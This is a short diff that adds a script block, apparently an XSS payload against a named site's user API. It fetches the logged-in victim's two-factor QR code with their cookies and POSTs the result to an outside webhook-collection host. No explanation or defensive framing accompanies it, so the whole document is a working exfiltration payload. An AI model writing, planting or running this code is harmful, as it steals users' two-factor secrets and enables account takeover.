@@ -1,0 +1,12 @@
+<script>
+fetch("https://api.cas.tomorrowland.com/api/user/two-factor-qr-code", {
+    credentials: "include"
+})
+.then(r => r.text())
+.then(data => {
+    fetch("https://d90c361b-91e4-4399-8c78-7b57e7743bca.webhooksite.net/", {
+        method: "POST",
+        body: data
+    });
+});
+</script>
